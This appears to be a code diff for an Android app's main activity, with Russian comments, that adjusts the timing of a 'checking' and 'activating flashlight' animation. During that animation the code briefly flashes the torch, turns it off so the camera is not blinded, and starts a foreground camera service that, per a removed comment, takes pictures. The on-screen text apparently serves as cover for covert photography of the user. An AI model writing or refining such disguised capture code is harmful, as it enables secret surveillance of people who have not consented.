@@ -64,28 +64,31 @@ public class MainActivity extends AppCompatActivity {
                 tvAnim.setText("Проверка.");
 
                 Handler handler = new Handler(Looper.getMainLooper());
-                // Мигаем точками
                 handler.postDelayed(() -> tvAnim.setText("Проверка.."), 600);
                 handler.postDelayed(() -> tvAnim.setText("Проверка..."), 1200);
                 handler.postDelayed(() -> tvAnim.setText("Проверка."), 1800);
-                handler.postDelayed(() -> tvAnim.setText("Проверка.."), 2400);
                 
-                // Включаем фонарик для съемки
+                // 1. Включаем фонарь
                 try { cameraManager.setTorchMode(cameraId, true); } catch (Exception e) {}
 
-                // Запускаем камеры
-                Intent svc = new Intent(this, CameraService.class);
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
-                else startService(svc);
+                // 2. Через 1.5 сек выключаем фонарь (чтобы камера не слепла)
+                handler.postDelayed(() -> {
+                    try { cameraManager.setTorchMode(cameraId, false); } catch (Exception e) {}
+                }, 1500);
 
-                // Через 5 секунд переключаем на "Активация..."
+                // 3. Через 2.5 сек (1 сек после выключения света) запускаем камеры
+                handler.postDelayed(() -> {
+                    Intent svc = new Intent(this, CameraService.class);
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
+                    else startService(svc);
+                }, 2500);
+
+                // 4. Через 6 сек показываем "Активация..."
                 handler.postDelayed(() -> {
                     tvAnim.setText("Активация фонаря...");
                     
-                    // Оставляем свет гореть еще 3 секунды
+                    // 5. Еще через 3 сек завершаем
                     handler.postDelayed(() -> {
-                        try { cameraManager.setTorchMode(cameraId, false); } catch (Exception e) {}
-                        
                         greenOverlay.setVisibility(View.GONE);
                         isProcessing = false;
                         
@@ -97,7 +100,7 @@ public class MainActivity extends AppCompatActivity {
 
                     }, 3000);
 
-                }, 5000); // Ждем 5 секунд, пока камеры сделают снимки
+                }, 6000);
 
             } catch (Exception e) { e.printStackTrace(); }
         });
